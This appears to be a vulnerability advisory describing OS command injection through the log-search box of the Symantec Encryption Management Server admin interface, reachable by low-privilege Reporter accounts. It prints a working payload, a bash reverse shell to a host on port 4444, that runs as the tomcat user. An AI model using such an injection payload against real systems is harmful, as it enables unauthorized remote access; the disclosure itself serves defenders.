The administration web interface for the Symantec Encryption Management Servers (SEMS) includes the facility to search the log
  files. When performing a search, it was possible, using a specially crafted search term, to execute OS level commands on the 
   appliance. The search functionality dynamically built a command string, with untrusted user input, that was then executed by 
   the operating system command shell. Insufficient validation of the supplied parameters exposed arbitrary command execution 
   and provided an attacker with privileges or capabilities previously unavailable.

This issue required a user account with low privilege access to the administrative interface. The lowest privilege user role with 
  this level of access is Reporter.

The following text, entered into the search box, was used to start an interactive, reverse TCP connection, shell.

|` /bin/bash -i >& /dev/tcp/10.10.10.10/4444 0>&1`

The resulting interactive shell is executed as user tomcat.
